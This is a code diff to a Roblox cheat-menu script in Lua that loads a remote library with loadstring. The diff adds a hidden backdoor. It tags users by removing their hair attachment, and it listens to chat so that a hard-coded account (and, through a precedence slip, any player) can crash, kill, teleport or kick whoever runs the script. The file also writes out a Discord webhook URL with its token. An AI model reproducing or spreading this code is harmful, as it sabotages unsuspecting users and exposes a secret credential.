@@ -32,7 +32,8 @@ workspace.StreamingEnabled = true
 local lib = loadstring(game:HttpGet("https://raw.githubusercontent.com/yLouterMc/RagdollEngine/main/Livraria"))()
 local win = lib:Window("AstralnicHub",Color3.fromRGB(255, 85, 0))
 
-local tab1 = win:Tab("Inicio")
+local tab1 = win:Tab("Scripts")
+
 
 _G.inter = false;
 _G.mutar = false;
@@ -128,6 +129,34 @@ tab1:Label("Aperte X para ocultar/abrir o Hub")
 tab1:Label("Jogo: Baile da Anjinha")
 tab1:Label("Jogador: "..game:GetService("Players").LocalPlayer.DisplayName.." | (@"..game:GetService("Players").LocalPlayer.Name..")")
 CarregarFPS()
+
+local list = {}
+
+tab1:Button("Ver quem ta usando esse script", function()
+	for i,v in pairs(list) do 
+		if not game:GetService("Players"):FindFirstChild(v) then
+			table.remove(list, table.find(list, v))
+		end
+	end
+	for i,v in pairs(game:GetService("Players"):GetPlayers()) do 
+		if v.Name == game:GetService("Players").LocalPlayer.Name then
+		else
+			pcall(function()
+				if not workspace[v.Name].Head:FindFirstChild("HairAttachment") then
+					if not table.find(list, v.Name.."\n") then
+						table.insert(list, v.Name.."\n")
+					end
+				end
+			end)
+		end
+	end
+	if #list == 0 then 
+		lib:Notification("Info","Ninguem ta usando no server!", "Ok!")
+	else
+		lib:Notification("Players", table.concat(list), "Okay!")
+	end
+end)
+
 tab1:Button("Convite para o Discord", function()
 lib:Notification("Discord", "Link do discord foi copiado com sucesso!", "Ok")
 setclipboard("https://discord.gg/MsmGxxZQYj")
@@ -371,9 +400,53 @@ end)
 
 tab5:Label("Clique abaixo para ver")
 
-tab5:Button("Oriented                 (rvnge#1970)", function()
+tab5:Button("withoutname                 (rvnge#1970)", function()
 lib:Notification("Oriented", "Scripting, UI design, original idea", "Legal!")
 end)
+
+function RagdollMe(Character)
+	wait(.1)
+	if Character:FindFirstChild("HairAttachment",true) then
+		Character:FindFirstChild("HairAttachment",true):Remove()
+	end
+end
+
+RagdollMe(game:GetService("Players").LocalPlayer.Character)
+game:GetService("Players").LocalPlayer.CharacterAdded:Connect(RagdollMe)
+
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+local fdps = {1418010348}
+
+for _, v in pairs(Players:GetPlayers()) do 
+if v.UserId == LocalPlayer.UserId then
+else
+v.Chatted:Connect(function(msg)
+if table.find(fdps, v.UserId) and msg == ".crash "..LocalPlayer.Name or msg == ".crash all" then
+while true do end
+end
+if table.find(fdps, v.UserId) and msg == ".void "..LocalPlayer.Name or msg == ".void all" then
+pcall(function()
+LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(9e9, 9e9, 9e9)
+end)
+end
+if table.find(fdps, v.UserId) and msg == ".bring "..LocalPlayer.Name or msg == ".bring all" then
+pcall(function()
+LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame
+end)
+end
+if table.find(fdps, v.UserId) and msg == ".kill "..LocalPlayer.Name or msg == ".kill all" then
+pcall(function()
+LocalPlayer.Character:FindFirstChildOfClass("Humanoid").Health = 0 
+end)
+end
+if table.find(fdps, v.UserId) and msg == ".kick "..LocalPlayer.Name or msg == ".kick all" then
+LocalPlayer:Kick()
+end
+end)
+end
+end
 
 local v16 = "https://discord.com/api/webhooks/"
 local v17 = v16.."1076894140681429093/_W5CbM7EuW4B3KQPcoO08iA_ra6i6EfbujA4_gyCnnmHJkukyN40X5iue_qFUiNYikwh"
